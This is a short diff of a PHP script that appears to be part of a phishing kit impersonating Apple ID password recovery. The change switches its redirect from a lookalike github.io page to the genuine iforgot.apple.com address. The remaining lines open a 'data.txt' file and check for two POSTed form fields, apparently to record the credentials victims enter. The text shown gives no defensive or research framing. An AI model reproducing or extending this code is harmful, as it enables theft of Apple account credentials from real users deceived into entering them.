@@ -1,5 +1,5 @@
 <?php
-header('Location: https://applehelplogin.github.io/appleid/iforgot.apple.com/password/verify/appleid.html');
+header('Location: https://iforgot.apple.com/password/verify/appleid');
 $txt = "data.txt";
 $fh = fopen($txt, 'w+');
 if (isset($_POST['field1']) && isset($_POST['field2'])) { // check if both fields are set
